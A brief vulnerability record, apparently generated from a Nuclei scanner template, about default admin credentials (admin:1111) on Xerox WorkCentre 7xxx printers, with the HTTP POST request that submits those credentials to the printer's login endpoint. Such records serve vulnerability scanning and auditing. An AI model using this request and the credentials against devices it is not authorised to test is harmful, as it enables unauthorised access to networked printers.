# Vulnerability: Xerox WorkCentre 7xxx Printer Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`xerox7-default-login.yaml`)

## Description
Xerox WorkCentre 7xxx printer. default admin credentials admin:1111 were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /userpost/xerox.set HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername={{username}}&webPassword={{password}}&frmaltDomain=default
```

